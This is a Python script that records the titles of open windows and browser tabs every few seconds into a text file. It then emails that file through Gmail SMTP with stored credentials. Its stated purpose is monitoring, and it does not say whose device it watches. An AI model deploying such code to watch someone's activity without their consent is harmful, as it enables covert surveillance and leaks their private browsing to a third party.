import pygetwindow as gw
from datetime import datetime
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from emailpassword import email_sender, email_password, email_reciever

class WindowMonitoring:
    """Monitors what browsers and tabs are open on the computer"""
    def __init__(self) -> None:
        self.last_windows = set()  # Initialize as an empty set
        self.history_length = 0
        self.email_interval = 30 
        with open('window_history.txt', 'w') as f:
            f.write('')
            
        while True:
            self.check_open_windows()
            time.sleep(5)

    def check_open_windows(self):
        windows = gw.getAllTitles()
        open_windows = set()
        for window in windows:
            if window.strip():  # Check if the title is non-empty after stripping whitespace
                open_windows.add(window)
        
        if open_windows != self.last_windows: # writes the history on a .txt file
            try:
                with open('window_history.txt', 'a') as f:
                    f.write(f'{self.history_length}: WINDOWS: {open_windows}, TIME: {datetime.now()} \n')
                    self.last_windows = open_windows
                    self.history_length += 1
            except: pass
        
        if self.history_length % self.email_interval == 0 and self.history_length != 0: 
        # After certain amount of length sends the .txt file to an email address
            self.send_email(email_sender, 
                            email_password, 
                            email_reciever,
                            f"Window History {self.history_length}",
                            "An suspicious activity has been recorded on your device.",
                            "window_history.txt"
                            )
    
    def send_email(self, sender_email, sender_password, recipient_email, subject, message, attachment_path):
        # Create a multipart message container
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject

        # Attach the message as plain text
        msg.attach(MIMEText(message, 'plain'))

        # Attach the text file
        with open(attachment_path, 'rb') as f:
            attachment = MIMEText(f.read().decode('cp1252'))
            attachment.add_header('Content-Disposition', 'attachment', filename=attachment_path)
            msg.attach(attachment)

        # Connect to the SMTP server
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()

        # Log in to the sender's email account
        server.login(sender_email, sender_password)

        # Send the email
        server.send_message(msg)

        # Clean up
        server.quit()
